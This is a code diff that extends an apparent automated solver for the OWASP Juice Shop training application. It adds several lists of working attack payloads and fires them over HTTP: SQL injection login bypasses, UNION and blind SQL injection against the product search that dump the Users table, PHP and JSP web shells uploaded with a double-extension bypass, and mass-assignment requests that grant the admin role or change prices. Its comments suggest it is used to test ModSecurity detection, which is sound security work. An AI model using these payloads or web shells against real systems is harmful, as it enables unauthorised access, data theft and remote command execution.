@@ -142,40 +142,129 @@ class JuiceShopSolver:
             return False
     
     def solve_sql_injection_login(self) -> bool:
-        """Solve SQL injection login bypass"""
+        """Solve SQL injection login bypass using multiple payloads"""
         url = urljoin(self.base_url, '/rest/user/login')
-        # Classic SQL injection payload
-        data = {
-            'email': "admin@juice-sh.op'--",
-            'password': 'anything'
-        }
-        try:
-            print(f"   🔗 Requesting: {url}")
-            print(f"   📤 Payload: {json.dumps(data, indent=2)}")
-            response = self.session.post(url, json=data)
-            print(f"   📊 Status Code: {response.status_code}")
-            print(f"   📏 Response Length: {len(response.text)} bytes")
-            
-            success = response.status_code == 200 and 'authentication' in response.text
-            if success:
-                print(f"   ✅ SQL Injection successful - authentication token found")
-                # Extract and show token info
-                try:
-                    resp_json = response.json()
-                    if 'authentication' in resp_json:
-                        token = resp_json['authentication'].get('token', 'N/A')[:50] + '...'
-                        print(f"   🔑 Token: {token}")
-                except:
-                    pass
-            else:
-                print(f"   ❌ SQL Injection failed")
-                if response.text:
-                    print(f"   📄 Response preview: {response.text[:200]}...")
+        
+        # Multiple SQL injection payloads
+        payloads = [
+            {
+                'name': 'Classic Comment Bypass',
+                'email': "admin@juice-sh.op'--",
+                'password': 'anything'
+            },
+            {
+                'name': 'Union-based Bypass',
+                'email': "' UNION SELECT * FROM Users WHERE email='admin@juice-sh.op'--",
+                'password': 'anything'
+            },
+            {
+                'name': 'OR 1=1 Bypass',
+                'email': "admin@juice-sh.op' OR '1'='1'--",
+                'password': 'anything'
+            },
+            {
+                'name': 'Boolean-based Bypass',
+                'email': "admin@juice-sh.op' OR 1=1#",
+                'password': 'anything'
+            }
+        ]
+        
+        for i, payload in enumerate(payloads, 1):
+            try:
+                data = {
+                    'email': payload['email'],
+                    'password': payload['password']
+                }
+                
+                print(f"   🔗 Attempting SQL injection {i}/{len(payloads)}: {payload['name']}")
+                print(f"   🔗 Requesting: {url}")
+                print(f"   📤 Payload: {json.dumps(data, indent=2)}")
+                response = self.session.post(url, json=data)
+                print(f"   📊 Status Code: {response.status_code}")
+                print(f"   📏 Response Length: {len(response.text)} bytes")
+                
+                success = response.status_code == 200 and 'authentication' in response.text
+                if success:
+                    print(f"   ✅ SQL Injection successful with {payload['name']}!")
+                    # Extract and show token info
+                    try:
+                        resp_json = response.json()
+                        if 'authentication' in resp_json:
+                            token = resp_json['authentication'].get('token', 'N/A')[:50] + '...'
+                            print(f"   🔑 Token: {token}")
+                    except:
+                        pass
+                    return True
+                else:
+                    print(f"   ❌ {payload['name']} failed")
+                    if response.text:
+                        print(f"   📄 Response preview: {response.text[:200]}...")
+                        
+            except requests.RequestException as e:
+                print(f"   ❌ Request exception for {payload['name']}: {e}")
+                continue
+                
+        print(f"   ❌ All SQL injection attempts failed")
+        return False
+    
+    def solve_sql_injection_search(self) -> bool:
+        """Solve SQL injection in product search (ModSecurity detectable)"""
+        # SQL injection in the search functionality
+        payloads = [
+            {
+                'name': 'UNION SELECT Attack',
+                'value': "')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--"
+            },
+            {
+                'name': 'Boolean-based Blind SQLi',
+                'value': "')) AND (SELECT COUNT(*) FROM Users WHERE email LIKE '%admin%') > 0--"
+            },
+            {
+                'name': 'Time-based Blind SQLi',
+                'value': "')) AND (SELECT SLEEP(5))--"
+            },
+            {
+                'name': 'Error-based SQLi',
+                'value': "')) UNION SELECT 1,2,3,4,5,6,7,8,9 FROM NonExistentTable--"
+            }
+        ]
+        
+        for i, payload in enumerate(payloads, 1):
+            try:
+                url = urljoin(self.base_url, f"/rest/products/search?q={payload['value']}")
+                print(f"   🔗 Attempting SQL injection {i}/{len(payloads)}: {payload['name']}")
+                print(f"   🔗 Requesting: {url}")
+                print(f"   📤 Payload: {payload['value']}")
+                
+                response = self.session.get(url)
+                print(f"   📊 Status Code: {response.status_code}")
+                print(f"   📏 Response Length: {len(response.text)} bytes")
+                
+                if response.status_code == 200:
+                    response_text = response.text.lower()
+                    # Check for SQL injection success indicators
+                    sql_indicators = [
+                        'admin@juice-sh.op', 'user@juice-sh.op', 'sqlite_error', 
+                        'syntax error', 'email', 'password', 'users', 'select'
+                    ]
                     
-            return success
-        except requests.RequestException as e:
-            print(f"   ❌ Request exception: {e}")
-            return False
+                    if any(indicator in response_text for indicator in sql_indicators):
+                        print(f"   ✅ SQL injection successful with {payload['name']}!")
+                        print(f"   📄 Response preview: {response.text[:300]}...")
+                        return True
+                    else:
+                        print(f"   ⚠️  Request successful but no SQL injection indicators")
+                else:
+                    print(f"   ❌ {payload['name']} blocked or failed")
+                    if response.text:
+                        print(f"   📄 Error response: {response.text[:200]}...")
+                        
+            except requests.RequestException as e:
+                print(f"   ❌ Request exception for {payload['name']}: {e}")
+                continue
+                
+        print(f"   ❌ All SQL injection search attempts failed or blocked")
+        return False
     
     def solve_path_traversal(self) -> bool:
         """Solve path traversal challenge"""
@@ -286,6 +375,147 @@ class JuiceShopSolver:
             print(f"   ❌ Request exception: {e}")
             return False
     
+    def solve_file_upload_bypass(self) -> bool:
+        """Solve file upload bypass challenge (ModSecurity detectable)"""
+        # Malicious file upload attempts
+        payloads = [
+            {
+                'name': 'PHP Webshell Upload',
+                'filename': 'shell.php',
+                'content': '<?php system($_GET["cmd"]); ?>',
+                'content_type': 'application/x-php'
+            },
+            {
+                'name': 'JSP Webshell Upload', 
+                'filename': 'shell.jsp',
+                'content': '<%@ page import="java.io.*" %><% Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
+                'content_type': 'application/x-jsp'
+            },
+            {
+                'name': 'Double Extension Bypass',
+                'filename': 'image.jpg.php',
+                'content': '<?php echo "File upload bypass"; system($_GET["c"]); ?>',
+                'content_type': 'image/jpeg'
+            }
+        ]
+        
+        for i, payload in enumerate(payloads, 1):
+            try:
+                url = urljoin(self.base_url, '/file-upload')
+                
+                # Create multipart form data
+                files = {
+                    'file': (payload['filename'], payload['content'], payload['content_type'])
+                }
+                
+                print(f"   🔗 Attempting file upload {i}/{len(payloads)}: {payload['name']}")
+                print(f"   🔗 Requesting: {url}")
+                print(f"   📤 File: {payload['filename']} ({payload['content_type']})")
+                print(f"   📄 Content preview: {payload['content'][:50]}...")
+                
+                response = self.session.post(url, files=files)
+                print(f"   📊 Status Code: {response.status_code}")
+                print(f"   📏 Response Length: {len(response.text)} bytes")
+                
+                if response.status_code in [200, 204]:
+                    print(f"   ✅ File upload successful with {payload['name']}!")
+                    if response.text:
+                        print(f"   📄 Response: {response.text[:200]}...")
+                    return True
+                else:
+                    print(f"   ❌ {payload['name']} blocked or failed")
+                    if response.text:
+                        print(f"   📄 Error response: {response.text[:200]}...")
+                        
+            except requests.RequestException as e:
+                print(f"   ❌ Request exception for {payload['name']}: {e}")
+                continue
+                
+        print(f"   ❌ All file upload attempts failed or blocked")
+        return False
+    
+    def solve_mass_assignment(self) -> bool:
+        """Solve mass assignment vulnerability (ModSecurity detectable)"""
+        # Mass assignment through user registration and update
+        attacks = [
+            {
+                'name': 'Admin Role Assignment',
+                'endpoint': '/api/Users/',
+                'method': 'POST',
+                'data': {
+                    'email': f'massassign{int(time.time())}@test.com',
+                    'password': 'Test123!',
+                    'passwordRepeat': 'Test123!',
+                    'role': 'admin',
+                    'isActive': True,
+                    'totpSecret': 'bypass',
+                    'securityQuestion': {'id': 1},
+                    'securityAnswer': 'test'
+                }
+            },
+            {
+                'name': 'Price Manipulation',
+                'endpoint': '/api/BasketItems/',
+                'method': 'POST', 
+                'data': {
+                    'ProductId': 1,
+                    'BasketId': 1,
+                    'quantity': 1,
+                    'price': 0.01  # Manipulate price
+                }
+            },
+            {
+                'name': 'User ID Manipulation',
+                'endpoint': '/api/Users/',
+                'method': 'POST',
+                'data': {
+                    'id': 999,  # Try to set specific ID
+                    'email': f'idmanip{int(time.time())}@test.com',
+                    'password': 'Test123!',
+                    'passwordRepeat': 'Test123!',
+                    'securityQuestion': {'id': 1},
+                    'securityAnswer': 'test'
+                }
+            }
+        ]
+        
+        for i, attack in enumerate(attacks, 1):
+            try:
+                url = urljoin(self.base_url, attack['endpoint'])
+                print(f"   🔗 Attempting mass assignment {i}/{len(attacks)}: {attack['name']}")
+                print(f"   🔗 Requesting: {url}")
+                print(f"   📤 Payload: {json.dumps(attack['data'], indent=2)}")
+                
+                if attack['method'] == 'POST':
+                    response = self.session.post(url, json=attack['data'])
+                
+                print(f"   📊 Status Code: {response.status_code}")
+                print(f"   📏 Response Length: {len(response.text)} bytes")
+                
+                if response.status_code in [200, 201]:
+                    print(f"   ✅ Mass assignment successful with {attack['name']}!")
+                    try:
+                        resp_json = response.json()
+                        if 'role' in resp_json and resp_json['role'] == 'admin':
+                            print(f"   🔐 Admin role successfully assigned!")
+                        if 'id' in resp_json:
+                            print(f"   🆔 User ID: {resp_json['id']}")
+                        print(f"   📄 Response preview: {response.text[:200]}...")
+                    except:
+                        print(f"   📄 Response preview: {response.text[:200]}...")
+                    return True
+                else:
+                    print(f"   ❌ {attack['name']} blocked or failed")
+                    if response.text:
+                        print(f"   📄 Error response: {response.text[:200]}...")
+                        
+            except requests.RequestException as e:
+                print(f"   ❌ Request exception for {attack['name']}: {e}")
+                continue
+                
+        print(f"   ❌ All mass assignment attempts failed or blocked")
+        return False
+    
     def get_solved_challenges(self) -> List[str]:
         """Get list of solved challenges"""
         try:
@@ -319,9 +549,12 @@ class JuiceShopSolver:
         solvers = {
             'DOM XSS': self.solve_dom_xss,
             'SQL Injection Login': self.solve_sql_injection_login,
+            'SQL Injection Search': self.solve_sql_injection_search,
             'Path Traversal': self.solve_path_traversal,
             'XSS in Search': self.solve_xss_in_search,
-            'Admin Registration': self.solve_admin_registration
+            'Admin Registration': self.solve_admin_registration,
+            'File Upload Bypass': self.solve_file_upload_bypass,
+            'Mass Assignment': self.solve_mass_assignment
         }
         
         # Run each solver
